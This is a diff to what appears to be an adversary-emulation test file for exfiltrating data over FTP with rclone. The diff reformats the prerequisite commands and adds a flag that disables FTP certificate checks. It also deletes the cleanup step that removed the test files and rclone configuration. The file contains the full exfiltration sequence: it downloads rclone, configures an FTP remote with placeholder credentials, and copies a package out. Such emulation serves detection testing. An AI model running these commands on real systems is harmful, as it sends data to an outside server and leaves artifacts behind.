@@ -185,12 +185,16 @@ atomic_tests:
       default: 21
   dependency_executor_name: powershell
   dependencies:
-  - description: Check if the exfil package exists
-    prereq_command: ' if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else {exit 1}'
-    get_prereq_command: fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760
+  - description: |
+      Check if the exfil package exists
+    prereq_command: |
+      if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else {exit 1}
+    get_prereq_command: | 
+      fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760
   - description: 'Check if rclone zip exists'
-    prereq_command: ' if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}'
-    get_prereq_command: |-
+    prereq_command: | 
+      if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}
+    get_prereq_command: |
       Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
       Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip -DestinationPath C:\Users\Public\Downloads\
   executor:
@@ -198,10 +202,6 @@ atomic_tests:
       $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName
       $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName
       &$rclone_bin config create ftpserver "ftp" "host" #{ftp_server} "port" #{ftp_port} "user" #{ftp_user} "pass" #{ftp_pass}
-      &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P
-    cleanup_command: |-
-      Remove-Item C:\Users\Public\Downloads\exfil.zip -Force -ErrorAction Ignore
-      Get-ChildItem -Path 'C:\Users\Public\Downloads\' -Filter rclone* | Remove-Item -Force -Recurse -ErrorAction Ignore
-      Remove-Item -Path $env:USERPROFILE\AppData\Roaming\rclone -Recurse -Force -ErrorAction Ignore
+      &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
     name: powershell
     elevation_required: true
